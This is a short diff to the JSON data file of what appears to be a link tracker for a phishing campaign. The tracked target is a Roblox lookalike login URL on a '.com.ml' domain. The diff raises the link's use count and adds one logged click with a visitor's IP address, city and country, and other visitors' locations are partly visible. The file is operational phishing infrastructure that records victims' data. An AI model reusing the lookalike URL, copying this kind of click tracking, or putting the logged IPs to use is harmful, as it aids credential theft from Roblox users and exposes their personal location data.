@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 74,
+    "useCount": 75,
     "createdBy": "admin",
     "clicks": [
       {
@@ -704,6 +704,14 @@
         "city": "Brampton",
         "flag": "🇨🇦",
         "countryCode": "CA"
+      },
+      {
+        "timestamp": 1776901458784,
+        "ip": "74.244.91.108",
+        "country": "United States",
+        "city": "Anchorage",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
